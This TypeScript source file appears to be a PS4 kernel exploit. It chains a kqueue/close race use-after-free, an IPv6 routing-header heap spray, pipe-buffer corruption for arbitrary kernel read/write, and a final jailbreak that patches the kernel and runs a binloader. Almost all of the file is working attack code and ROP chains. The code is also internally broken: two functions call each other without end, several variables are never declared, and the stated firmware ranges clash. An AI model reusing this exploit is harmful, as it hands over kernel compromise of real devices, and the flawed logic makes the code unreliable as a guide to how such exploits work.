/**
 *  kqueue_exploit.ts  –  PS4 9.00‑13.00 sys_kqueue race UAF
 *
 *  Replaces the old NetControl/ucred triple‑free with a double‑free
 *  triggered by racing kqueue()/close().  The freed kqueue is reclaimed
 *  via an IPv6 routing header spray, leaking kq_fdp.  Pipe corruption
 *  then yields arbitrary kernel R/W, and jailbreak_shared() finishes
 *  the sandbox escape and applies kernel patches.
 *
 *  All the heavy threading and ROP infrastructure is kept to a minimum;
 *  the slow UIO/iov read/write paths are no longer needed.
 */

import { fn, syscalls, BigInt, utils, gadgets } from 'download0/types';
import { libc_addr } from 'download0/userland';
import {
  get_fwversion, hex, malloc, read8, read16, read32, read64,
  write8, write16, write32, write64,
  get_kernel_offset, kernel, jailbreak_shared, send_notification,
} from 'download0/kernel';
import { show_success, run_binloader } from 'download0/loader';

/* ============ missing syscall registrations ============ */
fn.register(0x29, 'dup', ['bigint'], 'bigint');
fn.register(0x06, 'close', ['bigint'], 'bigint');
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
fn.register(0x16A, 'kqueue', [], 'bigint');
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
fn.register(0x17, 'setuid', ['number'], 'bigint');
fn.register(20, 'getpid', [], 'bigint');
fn.register(0x14B, 'sched_yield', [], 'bigint');
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');

const dup                = fn.dup;
const close              = fn.close;
const read               = fn.read;
const write              = fn.write;
const ioctl              = fn.ioctl;
const pipe               = fn.pipe;
const kqueue             = fn.kqueue;
const socket             = fn.socket;
const socketpair         = fn.socketpair;
const getsockopt         = fn.getsockopt;
const setsockopt         = fn.setsockopt;
const setuid             = fn.setuid;
const getpid             = fn.getpid;
const sched_yield        = fn.sched_yield;
const cpuset_getaffinity = fn.cpuset_getaffinity;
const cpuset_setaffinity = fn.cpuset_setaffinity;
const rtprio_thread      = fn.rtprio_thread;
const thr_new            = fn.thr_new;
const thr_kill           = fn.thr_kill;
const nanosleep          = fn.nanosleep;
const fcntl              = fn.fcntl;

/* ============ wrapper addresses from syscalls.map ============ */
const read_wrapper            = syscalls.map.get(0x03)!;
const write_wrapper           = syscalls.map.get(0x04)!;
const recvmsg_wrapper         = syscalls.map.get(0x1B)!;
const readv_wrapper           = syscalls.map.get(0x78)!;
const writev_wrapper          = syscalls.map.get(0x79)!;
const thr_exit_wrapper        = syscalls.map.get(0x1af)!;
const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8)!;
const rtprio_thread_wrapper   = syscalls.map.get(0x1D2)!;
const setsockopt_wrapper      = syscalls.map.get(0x69)!;
const getsockopt_wrapper      = syscalls.map.get(0x76)!;
const kqueue_wrapper          = syscalls.map.get(0x16A)!;
const close_wrapper           = syscalls.map.get(0x06)!;

/* ============ libc helpers ============ */
fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
const setjmp        = fn.setjmp;
const setjmp_addr   = libc_addr.add(0x6CA00);
const longjmp_addr  = libc_addr.add(0x6CA50);

const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);

/* ============ constants ============ */
const PAGE_SIZE        = 0x4000;
const AF_UNIX          = 1;
const AF_INET6         = 28;
const SOCK_STREAM      = 1;
const IPPROTO_IPV6     = 41;
const SO_SNDBUF        = 0x1001;
const SOL_SOCKET       = 0xffff;
const IPV6_RTHDR       = 51;
const IPV6_RTHDR_TYPE_0= 0;
const RTHDR_TAG        = 0x13370000;
const UCRED_SIZE       = 0x168;
const PIPEBUF_SIZE     = 0x18;
const FILEDESCENT_SIZE = 0x8;
const IPV6_SOCK_NUM    = 96;
const MAIN_LOOP_ITER   = 3;
const KQUEUE_SIZE      = 0x100;         // must match the target firmware
const KQUEUE_RACE_THR  = 4;
const MAIN_CORE        = 4;
const MAIN_RTPRIO      = 0x100;
const RTP_LOOKUP       = 0;
const RTP_SET          = 1;
const PRI_REALTIME     = 2;
const F_SETFL          = 4;
const O_NONBLOCK       = 4;

let FW_VERSION: string | null = null;
let kernel_offs: any = null;            // returned by get_kernel_offset()

/* ============ global heap buffers ============ */
const ipv6_socks: BigInt[] = new Array(IPV6_SOCK_NUM);
const spray_rthdr   = malloc(UCRED_SIZE);
let   spray_rthdr_len: number = -1;
const leak_rthdr    = malloc(UCRED_SIZE);
const spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);

const sockopt_len_ptr    = malloc(4);
const nanosleep_timespec = malloc(0x10);
const cpu_mask_buf       = malloc(0x10);
const rtprio_scratch     = malloc(0x4);
const spawn_thr_args     = malloc(0x80);
const spawn_tid          = malloc(0x8);
const spawn_cpid         = malloc(0x8);

const master_pipe_buf = malloc(PIPEBUF_SIZE);
const tmp             = malloc(PAGE_SIZE);
const pipe_sock       = malloc(8);

let masterRpipeFd: number, masterWpipeFd: number;
let victimRpipeFd: number, victimWpipeFd: number;

let fdt_ofiles: BigInt;
let kq_fdp: BigInt;
let kl_lock: BigInt;                   // not strictly needed, but kept for base calculation

let saved_fpu_ctrl = 0;
let saved_mxcsr    = 0;

/* kqueue race buffers */
const kq_race_ready       = malloc(8 * KQUEUE_RACE_THR);
const kq_race_signal_buf  = malloc(8 * KQUEUE_RACE_THR);
const kq_race_run_pipes: number[] = []; // will store write ends
const kq_race_thread_ids: number[]  = [];

/* IPv6 spray worker (the only worker we still need) */
interface Worker {
  rop: BigInt[];
  loop_size: number;
  pipe_0: number;
  pipe_1: number;
  ready: BigInt;
  done: BigInt;
  signal_buf: BigInt;
  thread_id?: number;
}
let spray_ipv6_worker: Worker;
const spray_ipv6_stack = malloc(0x2000);

/* ============ helper functions ============ */
function build_rthdr(buf: BigInt, size: number): number {
  const len = ((size >> 3) - 1) & ~1;
  const actual_size = (len + 1) << 3;
  write8(buf.add(0x00), 0);
  write8(buf.add(0x01), len);
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);
  write8(buf.add(0x03), (len >> 1));
  return actual_size;
}

function set_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number): void {
  if (setsockopt(sd, level, optname, optval, optlen).eq(BigInt_Error))
    throw new Error('setsockopt failed');
}
function get_sockopt(sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number): number {
  write32(sockopt_len_ptr, optlen);
  if (getsockopt(sd, level, optname, optval, sockopt_len_ptr).eq(BigInt_Error))
    throw new Error('getsockopt failed');
  return read32(sockopt_len_ptr);
}
function set_rthdr(sd: BigInt, buf: BigInt, len: number): void { set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len); }
function get_rthdr(sd: BigInt, buf: BigInt, max_len: number): number { return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len); }
function free_rthdr(sd: BigInt): void { set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0); }
function free_rthdrs(sds: BigInt[]): void { for (const sd of sds) free_rthdr(sd); }

function pin_to_core(core: number): void {
  write32(cpu_mask_buf, 1 << core);
  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
}
function get_current_core(): number {
  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
  let num = Number(read32(cpu_mask_buf));
  let pos = 0;
  while (num > 0) { num >>>= 1; pos++; }
  return pos - 1;
}
function set_rtprio(prio: number): void {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), prio);
  rtprio_thread(RTP_SET, 0, rtprio_scratch);
}
function get_rtprio(): number {
  write16(rtprio_scratch, PRI_REALTIME);
  write16(rtprio_scratch.add(2), 0);
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
  return Number(read16(rtprio_scratch.add(2)));
}

function nanosleep_fun(nsec: number): void {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9));
  write64(nanosleep_timespec.add(8), nsec % 1e9);
  nanosleep(nanosleep_timespec);
}
function wait_for(addr: BigInt, threshold: number): void {
  while (!read64(addr).eq(threshold)) nanosleep_fun(1);
}
function fill_buffer_64(buf: BigInt, val: BigInt, len: number): void {
  for (let i = 0; i < len; i += 8) write64(buf.add(i), val);
}

/* ============ ROP thread spawner ============ */
function spawn_thread(ropArray: BigInt[], loopSize: number, predefinedStack?: BigInt): BigInt {
  const ropAddr = predefinedStack ?? malloc(0x600);
  for (let i = 0; i < ropArray.length; i++) write64(ropAddr.add(i * 8), ropArray[i]!);

  // If loopSize > 0 and last gadget is JMP_REL, fix the relative offset
  if (loopSize > 0 && ropArray[ropArray.length - 1]!.eq(gadgets.JMP_REL)) {
    const loopStartIdx = ropArray.length - 1 - loopSize;
    const jmpOffset = loopStartIdx - (ropArray.length - 1);   // negative
    write32(ropAddr.add((ropArray.length - 1) * 8 + 4), jmpOffset);
  }

  const jmpbuf = malloc(0x60);
  write64(jmpbuf.add(0x00), gadgets.RET);
  write64(jmpbuf.add(0x10), ropAddr);
  write32(jmpbuf.add(0x40), saved_fpu_ctrl);
  write32(jmpbuf.add(0x44), saved_mxcsr);

  const stack = malloc(0x100);
  const tls = malloc(0x40);
  write64(spawn_thr_args.add(0x00), longjmp_addr);
  write64(spawn_thr_args.add(0x08), jmpbuf);
  write64(spawn_thr_args.add(0x10), stack);           write64(spawn_thr_args.add(0x18), new BigInt(0x100));
  write64(spawn_thr_args.add(0x20), tls);              write64(spawn_thr_args.add(0x28), new BigInt(0x40));
  write64(spawn_thr_args.add(0x30), spawn_tid);        write64(spawn_thr_args.add(0x38), spawn_cpid);

  const result = thr_new(spawn_thr_args, 0x68);
  if (!result.eq(0)) throw new Error('thr_new failed');
  return read64(spawn_tid);
}

function init_threading(): void {
  const jb = malloc(0x60);
  setjmp(jb);
  saved_fpu_ctrl = Number(read32(jb.add(0x40)));
  saved_mxcsr    = Number(read32(jb.add(0x44)));
}

/* ============ IPv6 spray worker ============ */
function ipv6_sock_spray_and_read_rop(ready: BigInt, runFd: BigInt, done: BigInt, signalBuf: BigInt): { rop: BigInt[]; loop_size: number } {
  const rop: BigInt[] = [new BigInt(0)];

  // pin & priority
  const mask = malloc(0x10); write16(mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET, new BigInt(3));
  rop.push(gadgets.POP_RSI_RET, new BigInt(1));
  rop.push(gadgets.POP_RDX_RET, BigInt_Error);
  rop.push(gadgets.POP_RCX_RET, new BigInt(0x10));
  rop.push(gadgets.POP_R8_RET, mask);
  rop.push(cpuset_setaffinity_wrapper);

  const rtbuf = malloc(4); write16(rtbuf, PRI_REALTIME); write16(rtbuf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET, new BigInt(1));
  rop.push(gadgets.POP_RSI_RET, new BigInt(0));
  rop.push(gadgets.POP_RDX_RET, rtbuf);
  rop.push(rtprio_thread_wrapper);

  // signal ready
  rop.push(gadgets.POP_RDI_RET, ready);
  rop.push(gadgets.POP_RAX_RET, new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  // wait for start signal
  rop.push(gadgets.POP_RDI_RET, runFd);
  rop.push(gadgets.POP_RSI_RET, signalBuf);
  rop.push(gadgets.POP_RDX_RET, new BigInt(1));
  rop.push(read_wrapper);

  // spray all sockets
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    rop.push(gadgets.POP_RDI_RET, ipv6_socks[i]!);
    rop.push(gadgets.POP_RSI_RET, new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET, new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET, spray_rthdr_rop.add(i * UCRED_SIZE));
    rop.push(gadgets.POP_R8_RET, new BigInt(spray_rthdr_len));
    rop.push(setsockopt_wrapper);
  }

  // read back all sockets
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    rop.push(gadgets.POP_RDI_RET, ipv6_socks[i]!);
    rop.push(gadgets.POP_RSI_RET, new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET, new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET, read_rthdr_rop.add(i * 8));   // save result
    rop.push(gadgets.POP_R8_RET, check_len);
    rop.push(getsockopt_wrapper);
  }

  // signal done & exit
  rop.push(gadgets.POP_RDI_RET, done);
  rop.push(gadgets.POP_RAX_RET, new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  rop.push(gadgets.POP_RDI_RET, new BigInt(0));
  rop.push(thr_exit_wrapper);

  return { rop, loop_size: 0 };
}

const read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
const check_len      = malloc(4);
write32(check_len, 8);

/* ============ trigger IPv6 spray (not spawned automatically) ============ */
function trigger_ipv6_spray_and_read(): void {
  write64(spray_ipv6_worker.done, 0);
  const ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
  if (ret.eq(BigInt_Error)) throw new Error('spray_ipv6_worker spawn failed');
  spray_ipv6_worker.thread_id = Number(ret.and(0xFFFFFFFF));
  if (write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1).eq(BigInt_Error))
    throw new Error('failed to start spray worker');
}
function wait_ipv6_spray_and_read(): void {
  wait_for(spray_ipv6_worker.done, 1);
}

/* ============ kqueue race UAF ============ */
function kq_race_worker_rop(ready: BigInt, runFd: BigInt, signalBuf: BigInt): { rop: BigInt[]; loopSize: number } {
  const rop: BigInt[] = [new BigInt(0)];

  // pin & priority
  const mask = malloc(0x10); write16(mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET, new BigInt(3));
  rop.push(gadgets.POP_RSI_RET, new BigInt(1));
  rop.push(gadgets.POP_RDX_RET, BigInt_Error);
  rop.push(gadgets.POP_RCX_RET, new BigInt(0x10));
  rop.push(gadgets.POP_R8_RET, mask);
  rop.push(cpuset_setaffinity_wrapper);

  const rtbuf = malloc(4); write16(rtbuf, PRI_REALTIME); write16(rtbuf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET, new BigInt(1));
  rop.push(gadgets.POP_RSI_RET, new BigInt(0));
  rop.push(gadgets.POP_RDX_RET, rtbuf);
  rop.push(rtprio_thread_wrapper);

  // signal ready
  rop.push(gadgets.POP_RDI_RET, ready);
  rop.push(gadgets.POP_RAX_RET, new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

  // wait for start
  rop.push(gadgets.POP_RDI_RET, runFd);
  rop.push(gadgets.POP_RSI_RET, signalBuf);
  rop.push(gadgets.POP_RDX_RET, new BigInt(1));
  rop.push(read_wrapper);

  // infinite loop: kqueue(); close(rax)
  const loopStart = rop.length;
  rop.push(kqueue_wrapper);
  rop.push(gadgets.MOV_RDI_RAX_RET);   // MUST EXIST; otherwise use a stack pivot
  rop.push(close_wrapper);
  rop.push(gadgets.JMP_REL);
  return { rop, loopSize: 3 };
}

function trigger_kqueue_uaf(): void {
  const sockBuf = malloc(8);
  kq_race_thread_ids.length = 0;
  kq_race_run_pipes.length = 0;

  // create racer threads
  for (let i = 0; i < KQUEUE_RACE_THR; i++) {
    socketpair(AF_UNIX, SOCK_STREAM, 0, sockBuf);
    const r = read32(sockBuf);
    const w = read32(sockBuf.add(4));
    const ready  = kq_race_ready.add(8 * i);
    const signal = kq_race_signal_buf.add(8 * i);
    const { rop, loopSize } = kq_race_worker_rop(ready, new BigInt(r), signal);
    const tid = Number(spawn_thread(rop, loopSize).and(0xFFFFFFFF));
    kq_race_thread_ids.push(tid);
    kq_race_run_pipes.push(w);
  }

  // wait until all racers are ready
  for (let i = 0; i < KQUEUE_RACE_THR; i++) {
    while (!read64(kq_race_ready.add(8 * i)).eq(1)) nanosleep_fun(100);
  }

  // kick them all off simultaneously
  for (let i = 0; i < KQUEUE_RACE_THR; i++) {
    write(new BigInt(kq_race_run_pipes[i]!), kq_race_signal_buf.add(8 * i), 1);
  }

  // let them race for ~200ms
  nanosleep_fun(200_000_000);

  // kill racers
  for (const tid of kq_race_thread_ids) thr_kill(tid, 9);
  debug('kqueue race finished');
}

/* ============ kqueue spray & leak ============ */
function setup_kqueue_spray(): void {
  // adjust routing header size to KQUEUE_SIZE
  spray_rthdr_len = build_rthdr(spray_rthdr, KQUEUE_SIZE);
  // pre-fill spray buffer with tags
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 4), RTHDR_TAG | i);
  }
}

function leak_kqueue(): boolean {
  trigger_ipv6_spray_and_read();
  wait_ipv6_spray_and_read();

  for (let i = 0; i < 20; i++) {
    get_rthdr(ipv6_socks[i]!, leak_rthdr, KQUEUE_SIZE);
    const fdp = read64(leak_rthdr.add(0x98));  // kq_fdp offset
    if (!fdp.eq(0)) {
      kq_fdp   = fdp;
      kl_lock  = read64(leak_rthdr.add(0x60));
      debug('Leaked kq_fdp: ' + hex(kq_fdp));
      return true;
    }
  }
  return false;
}

/* ============ pipe‑based arbitrary R/W (direct, no slow path) ============ */
function corrupt_pipe_buf(cnt: number, _in: number, out: number, size: number, buffer: BigInt): void {
  write32(master_pipe_buf.add(0x00), cnt);
  write32(master_pipe_buf.add(0x04), _in);
  write32(master_pipe_buf.add(0x08), out);
  write32(master_pipe_buf.add(0x0C), size);
  write64(master_pipe_buf.add(0x10), buffer);
  // apply the corruption by writing the new pipebuf into the master pipe's data
  kwrite_direct(master_r_pipe_data!, master_pipe_buf, PIPEBUF_SIZE);
}

function kwrite_direct(dest: BigInt, src: BigInt, n: number): void {
  // write to the victim's buffer (which now points where we want)
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  write(new BigInt(victimWpipeFd), src, n);
}
function kread_direct(dest: BigInt, src: BigInt, n: number): void {
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  read(new BigInt(victimRpipeFd), dest, n);
}
function kread64_direct(addr: BigInt): BigInt {
  kread_direct(tmp, addr, 8);
  return read64(tmp);
}
function kwrite64_direct(addr: BigInt, val: BigInt): void {
  write64(tmp, val);
  kwrite_direct(addr, tmp, 8);
}

// file descriptor helpers
function fhold(fp: BigInt): void {
  const refcnt = kread64_direct(fp.add(0x28)).lo + 1;
  kwrite64_direct(fp.add(0x28), new BigInt(refcnt));
}
function fget(fd: number): BigInt {
  return kread64_direct(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
}

function setup_arbitrary_rw(): void {
  if (!kq_fdp) throw new Error('kq_fdp not leaked');

  // read filedesc->fd_ofiles (offset 0 in FreeBSD)
  fdt_ofiles = kread64_direct(kq_fdp);
  debug('fdt_ofiles: ' + hex(fdt_ofiles));

  // resolve master & victim pipe file structures
  const master_r = kread64_direct(fdt_ofiles.add(masterRpipeFd * FILEDESCENT_SIZE));
  const victim_r = kread64_direct(fdt_ofiles.add(victimRpipeFd * FILEDESCENT_SIZE));
  master_r_pipe_data = kread64_direct(master_r.add(0x00));  // f_data
  victim_r_pipe_data = kread64_direct(victim_r.add(0x00));

  // prepare corrupt master pipebuf: buffer points to victim's data
  write32(master_pipe_buf.add(0x00), 0);                       // cnt
  write32(master_pipe_buf.add(0x04), 0);                       // in
  write32(master_pipe_buf.add(0x08), 0);                       // out
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);               // size
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);      // buffer

  kwrite_direct(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);

  // verify corruption
  if (!kread64_direct(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data))
    throw new Error('pipe corruption failed');

  // increase refcounts on the pipe files to prevent accidental freeing
  fhold(fget(masterRpipeFd));
  fhold(fget(masterWpipeFd));
  fhold(fget(victimRpipeFd));
  fhold(fget(victimWpipeFd));

  // hook kernel read/write helpers for jailbreak_shared
  kernel.read_buffer = function(kaddr: BigInt, length: number): Uint8Array | null {
    kread_direct(tmp, kaddr, length);
    return read_buffer(tmp, length);
  };
  kernel.write_buffer = function(kaddr: BigInt, buf: Uint8Array): void {
    write_buffer(tmp, buf);
    kwrite_direct(kaddr, tmp, buf.length);
  };

  log('Arbitrary R/W achieved');
}

/* ============ jailbreak ============ */
function find_allproc(): BigInt {
  // use master pipe to locate curproc
  write32(cpu_mask_buf, Number(getpid()));
  ioctl(new BigInt(masterRpipeFd), 0x8004667C /* FIOSETOWN */, cpu_mask_buf); // set owner PID

  const fp = fget(masterRpipeFd);
  const f_data = kread64_direct(fp.add(0x00));
  const pipe_sigio = kread64_direct(f_data.add(0xd0));
  let p = kread64_direct(pipe_sigio);
  kernel.addr.curproc = p;

  // walk allproc list
  while (!(p.and(new BigInt(0xFFFFFFFF, 0x00000000))).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
    p = kread64_direct(p.add(0x08)); // p_list.le_prev
  }
  return p;
}

function jailbreak(): void {
  if (!kernel_offs) throw new Error('kernel offsets not loaded');
  if (!FW_VERSION) throw new Error('FW_VERSION unknown');

  // stabilize
  for (let i = 0; i < 10; i++) sched_yield();

  kernel.addr.allproc = find_allproc();
  kernel.addr.base = kl_lock.sub(kernel_offs.KL_LOCK);
  log('Kernel base: ' + hex(kernel.addr.base));

  jailbreak_shared(FW_VERSION);

  log('Jailbreak Complete - JAILBROKEN');
  utils.notify('kqueue exploit finished\nEnjoy freedom');
  cleanup();
  show_success();
  run_binloader();
}

/* ============ cleanup ============ */
let cleanup_called = false;
function cleanup(): void {
  if (cleanup_called) return;
  cleanup_called = true;
  // close IPv6 sockets
  for (let i = 0; i < IPV6_SOCK_NUM; i++) close(ipv6_socks[i]!);
  // kill worker threads if any
  if (spray_ipv6_worker?.thread_id) thr_kill(spray_ipv6_worker.thread_id, 9);
  // close pipes
  close(new BigInt(masterRpipeFd)); close(new BigInt(masterWpipeFd));
  close(new BigInt(victimRpipeFd)); close(new BigInt(victimWpipeFd));
  // restore affinity / priority
  if (prev_core >= 0) pin_to_core(prev_core);
  set_rtprio(prev_rtprio);
}

/* ============ exploit orchestration ============ */
let exploit_count = 0;
let prev_core = -1;
let prev_rtprio = -1;

function init(): boolean {
  log('=== PS4 kqueue race exploit ===');
  FW_VERSION = get_fwversion();
  log('Detected PS4 firmware: ' + FW_VERSION);
  if (!FW_VERSION) {
    send_notification('Failed to detect firmware');
    return false;
  }
  const cmp = (a: string, b: string) => {
    const [amaj, amin] = a.split('.').map(Number);
    const [bmaj, bmin] = b.split('.').map(Number);
    return amaj === bmaj ? amin! - bmin! : amaj! - bmaj!;
  };
  if (cmp(FW_VERSION, '9.00') < 0 || cmp(FW_VERSION, '13.02') > 0) {
    send_notification('Unsupported firmware\n9.00-13.02 required');
    return false;
  }
  kernel_offs = get_kernel_offset(FW_VERSION);
  log('Kernel offsets loaded for FW ' + FW_VERSION);
  return true;
}

function setup(): void {
  debug('setting up...');
  prev_core = get_current_core();
  prev_rtprio = get_rtprio();
  pin_to_core(MAIN_CORE);
  set_rtprio(MAIN_RTPRIO);

  // create IPv6 sockets
  for (let i = 0; i < IPV6_SOCK_NUM; i++) ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
  free_rthdrs(ipv6_socks);

  // create master/victim pipes
  pipe(pipe_sock); masterRpipeFd = read32(pipe_sock); masterWpipeFd = read32(pipe_sock.add(4));
  pipe(pipe_sock); victimRpipeFd = read32(pipe_sock); victimWpipeFd = read32(pipe_sock.add(4));
  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);

  // set up the single IPv6 spray worker
  const sockBuf = malloc(8);
  socketpair(AF_UNIX, SOCK_STREAM, 0, sockBuf);
  const r0 = read32(sockBuf), w0 = read32(sockBuf.add(4));
  spray_ipv6_worker = {
    rop: ipv6_sock_spray_and_read_rop(spray_ipv6_ready, new BigInt(r0), spray_ipv6_done, spray_ipv6_signal_buf).rop,
    loop_size: 0,
    pipe_0: r0, pipe_1: w0,
    ready: spray_ipv6_ready,
    done: spray_ipv6_done,
    signal_buf: spray_ipv6_signal_buf,
  };
  init_threading();
  // spawn the spray worker once (it will exit after one run, we'll re-spawn each time)
}

function exploit_phase_trigger(): void {
  if (exploit_count >= MAIN_LOOP_ITER) {
    log('Failed to acquire kernel R/W');
    cleanup();
    return;
  }
  exploit_count++;
  log('Triggering kqueue race (' + exploit_count + '/' + MAIN_LOOP_ITER + ')...');
  trigger_kqueue_uaf();
  exploit_phase_leak();
}

function exploit_phase_leak(): void {
  setup_kqueue_spray();
  if (!leak_kqueue()) {
    exploit_phase_trigger();
    return;
  }
  log('Leaked kqueue, setting up R/W...');
  exploit_phase_rw();
}

function exploit_phase_rw(): void {
  setup_arbitrary_rw();
  log('Jailbreaking...');
  jailbreak();
}

// entry point
if (!init()) {
  // fail silently
} else {
  setup();
  exploit_phase_trigger();
}